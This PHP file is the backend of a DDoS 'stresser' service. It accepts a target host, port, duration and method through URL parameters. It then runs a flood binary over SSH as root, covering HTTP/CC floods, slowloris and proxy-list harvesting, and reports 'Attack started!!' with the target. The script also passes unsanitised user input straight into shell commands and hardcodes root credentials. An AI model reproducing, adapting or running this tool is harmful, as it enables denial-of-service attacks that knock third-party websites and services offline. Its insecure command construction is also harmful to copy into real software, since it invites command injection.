<?php
ignore_user_abort(true);
set_time_limit(1000);
$server_ip = "192.168.31.254"; //ip
$server_pass = "123"; //密码
$server_user = "root"; //账号 
$key = $_GET['key'];
$host = $_GET['host'];
$port = intval($_GET['port']);
$time = intval($_GET['time']);
$method = $_GET['method'];
$action = $_GET['action'];
$array = array("cc", "mb", "ccs", "mbs", "slow", "smb", "get", "gets", "chk", "chks", "stop");
$ray = array("ccgo"); //key
$proxyapi = "/var/www/html/proxyapi.txt";

if (!empty($key)) { } else {
    die('Error: API key is empty!');
}
if (in_array($key, $ray)) { } else {
    die('Error: Incorrect API key!');
}
if (!empty($method)) { 
    if ($method == "ccs"||$method == "gets"||$method == "chks"){
        $proxies = "/var/www/html/socks5.txt";
    }
    if ($method == "cc"||$method == "get"||$method == "chk"){
        if ($port == 443){
            $proxies = "/var/www/html/https.txt";
        }
        else {
            $proxies = "/var/www/html/http.txt";
        }
    }
} else {
    die('Error: Method is empty!');
}
if (!empty($time)) { } else {
    die('Error: time is empty!');
}
if (!empty($host)) { } else {
    if ($host != "get"||$method != "chk"||$method != "gets"||$method != "chks" ){
    }else{
        die('Error: Host is empty!');   
    }
}
if (in_array($method, $array)) { } else {
    die('Error: The method you requested does not exist!');
}
if ($port > 44405) {
    die('Error: Ports over 44405 do not exist');
}
if ($time > 3600) {
    die('Error: Cannot exceed 3600 seconds!');
}
if (ctype_digit($Time)) {
    die('Error: Time is not in numeric form!');
}
if (ctype_digit($Port)) {
    die('Error: Port is not in numeric form!');
}
if ($method == "cc") {
    $command = "/var/www/html/cc -u $host -p $port -t $time -o $proxies -th 6000 -mu 800 >/dev/null 2>&1";
}
if ($method == "mb") {
    $command = "/var/www/html/cc -u $host -p $port -t $time -o $proxies -c mobile -th 6000 -mu 800 >/dev/null 2>&1";
}
if ($method == "ccs") {
    $command = "/var/www/html/cc -u $host -p $port -t $time -o $proxies -s socks5 -th 5000 -mu 500 >/dev/null 2>&1";
}
if ($method == "mbs") {
    $command = "/var/www/html/cc -u $host -p $port -t $time -o $proxies -s socks5 -c mobile -th 5000 -mu 500 >/dev/null 2>&1";
}
if ($method == "slow") {
    $command = "/var/www/html/cc -u $host -p $port -t $time -o $proxies -me slow -th 1000 >/dev/null 2>&1";
}
if ($method == "smb") {
    $command = "/var/www/html/cc -u $host -p $port -t $time -o $proxies -me slow -c mobile -th 1000 >/dev/null 2>&1";
}
if ($method == "get") {
    $command = "/var/www/html/cc -m get -p $port -o $proxies -a $proxyapi >/dev/null 2>&1";
}
if ($method == "gets") {
    $command = "/var/www/html/cc -m get -s socks5 -o $proxies -a $proxyapi >/dev/null 2>&1";
}
if ($method == "chk") {
    $command = "/var/www/html/cc -m check -p $port -o $proxies >/dev/null 2>&1";
}
if ($method == "chks") {
    $command = "/var/www/html/cc -m check -s socks5 -o $proxies >/dev/null 2>&1";
}
if ($action == "stop") {
    $command = "pkill $host -f";
}
if (!function_exists("ssh2_connect")) die("Error: SSH2 does not exist on you're server");
if (!($con = ssh2_connect($server_ip, 22))) {
    echo "Error: Connection Issue";
} else {
    if (!ssh2_auth_password($con, $server_user, $server_pass)) {
        echo "Error: Login failed, one or more of you're server credentials are incorrect.";
    } else {
        if (!($stream = ssh2_exec($con, $command))) {
            echo "Error: You're server was not able to execute you're methods file and or its dependencies";
        } else {
            stream_set_blocking($stream, false);
            $data = "";
            while ($buf = fread($stream, 4096)) {
                $data .= $buf;
            }
            if ($method == "get"||$method == "chk"||$method == "gets"||$method == "chks") {
                $line = count(file($proxies));
                echo $line;         
            } else {
                echo "Attack started!!</br>Hitting: $host</br>On Port: $port </br>Attack Length: $time</br>With: $method</br>";
                echo "EXEC: $command";
            }
            fclose($stream);
        }
    }
}
?>